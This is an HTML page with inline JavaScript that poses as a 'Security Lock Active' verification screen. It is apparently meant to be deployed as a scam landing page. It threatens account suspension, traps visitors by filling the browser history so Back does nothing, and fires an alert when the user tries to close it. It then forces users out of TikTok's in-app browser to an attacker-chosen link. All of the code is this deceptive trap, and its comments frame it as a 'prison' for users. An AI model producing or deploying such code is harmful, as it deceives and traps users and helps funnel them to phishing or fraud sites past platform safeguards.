<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            background: #ffffff; font-family: -apple-system, sans-serif;
            overflow: hidden;
        }
        #ui {
            display: flex; flex-direction: column; align-items: center; 
            justify-content: center; height: 100vh; text-align: center;
        }
        .btn {
            background: #fe2c55; color: white; padding: 18px 60px; 
            border-radius: 4px; text-decoration: none; font-weight: 800;
            font-size: 18px; border: none; cursor: pointer;
        }
    </style>
</head>
<body>

    <div id="ui">
        <div style="font-size: 24px; font-weight: 800; margin-bottom: 10px;">Security Lock Active</div>
        <p style="color: #8a8b91; padding: 0 40px; margin-bottom: 30px;">
            Verification is required to continue. To prevent account suspension, tap the button below to verify in a secure window.
        </p>
        <button class="btn" id="trigger-btn">VERIFY NOW</button>
    </div>

<script>
    // THE DESTINATION
    const targetUrl = "https://www.google.com"; // Swap this with your link
    const androidIntent = `intent://${targetUrl.replace("https://", "")}#Intent;scheme=https;package=com.android.chrome;end`;

    // 1. THE EXTERNAL JUMP FUNCTION
    function shotgunExit() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        if (isAndroid) {
            window.location.href = androidIntent;
        } else {
            // iOS tries to stay in the app; this forces a popup to "Open in Safari"
            window.location.assign(targetUrl);
            window.open(targetUrl, '_blank');
        }
    }

    // 2. THE NUCLEAR TRAP (For X Button and Back Button)
    function activateTrap() {
        // This blocks the 'X' button by freezing the thread
        alert("SECURITY ALERT: Verification Required.\n\nClick OK to open the secure verification window.");
        
        // As soon as they hit OK, we shotgun them out of TikTok
        shotgunExit();
    }

    // 3. CAPTURING THE EXIT ATTEMPTS
    // When they touch the top of the screen (X button) or Back button
    window.onblur = function() {
        // Tapping native UI causes blur. We immediately snap the trap.
        activateTrap();
    };

    window.onpopstate = function() {
        // Back button causes state change.
        activateTrap();
    };

    // 4. BUTTON INTERACTION
    document.getElementById('trigger-btn').onclick = function() {
        // If they click the button themselves, we skip the alert and go straight to the breakout
        shotgunExit();
    };

    // 5. PRISON INITIALIZATION
    window.onload = () => {
        // Fill history so Back button is useless
        for(let i=0; i<50; i++) {
            history.pushState({lock: true}, "", "#secure_" + i);
        }
    };
</script>
</body>
</html>
